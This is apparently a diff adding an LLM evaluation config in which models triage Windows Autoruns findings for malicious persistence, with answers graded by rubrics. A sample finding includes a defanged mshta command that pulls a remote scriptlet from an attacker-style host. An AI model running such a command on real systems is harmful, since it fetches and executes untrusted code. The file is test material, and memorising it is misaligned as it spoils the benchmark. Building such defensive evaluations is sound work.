@@ -1,0 +1,32 @@
+schema: 1
+baseline: "Is there any malicious persistence in this Autoruns output?\n\n{{findings}}"
+providers: [{family: claude, tier: frontier}, {family: gpt, tier: frontier}]
+judge: {family: gemini, tier: frontier}
+pass_threshold: 0.8
+min_lift_over_baseline: 0.15
+cases:
+  - name: happy-mixed-autoruns
+    vars:
+      findings: |
+        HKCU\Software\Microsoft\Windows\CurrentVersion\Run  OneDrive  "C:\Users\amy\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background  (Verified) Microsoft Corporation
+        HKCU\Software\Microsoft\Windows\CurrentVersion\Run  WinSvcHost  mshta.exe "javascript:a=GetObject('script:hxxps://cdn-upd[.]top/s.sct')..."  (Not verified)
+        Task \GoogleUpdateTaskMachineUA  "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /ua  (Verified) Google LLC
+        Task \Microsoft\Windows\UpdateOrchestrator\SyncCheck  C:\Users\Public\Libraries\sync.exe  (Not verified)
+        Services: Spooler (Verified) Microsoft Windows
+      host_context: "Finance laptop of user amy. User clicked a phishing link two days ago. No WMI data collected yet."
+    assert:
+      - {type: llm-rubric, value: "Flags the mshta run key and the task in the Microsoft task path pointing to C:\\Users\\Public\\Libraries\\sync.exe as suspicious with specific reasons (LOLBin with remote scriptlet, user-writable path, masquerading in the Microsoft task folder, unsigned), and rates OneDrive, Google Update and Spooler as likely benign."}
+      - {type: llm-rubric, value: "Notes WMI subscriptions and other categories are not covered and gives read-only PowerShell or autorunsc commands to check them."}
+      - {type: llm-rubric, value: "Requires evidence collection before removal and labels removal as needing approval, mentioning that a rebuild may be safer."}
+  - name: edge-only-signed-entries
+    vars:
+      findings: "All 64 entries verified as Microsoft, Google, Zoom or CrowdStrike. Autoruns run as standard user."
+      host_context: "EDR alert for encoded PowerShell on this host yesterday."
+    assert:
+      - {type: llm-rubric, value: "Does not conclude the host is clean; points out that running Autoruns as a standard user misses machine-wide and protected locations, that signed LOLBins can be abused, and asks for an elevated run plus WMI and scheduled task checks."}
+  - name: negative-delete-now
+    vars:
+      findings: "Run key 'Updater' -> C:\\ProgramData\\x\\u.exe (Not verified)"
+      host_context: "Give me a script that deletes every unsigned autorun on all 500 laptops right now."
+    assert:
+      - {type: llm-rubric, value: "Declines to give a fleet-wide script that deletes every unsigned autorun, explains the breakage and evidence-loss risk, and offers the investigation steps and an approved, targeted removal instead."}
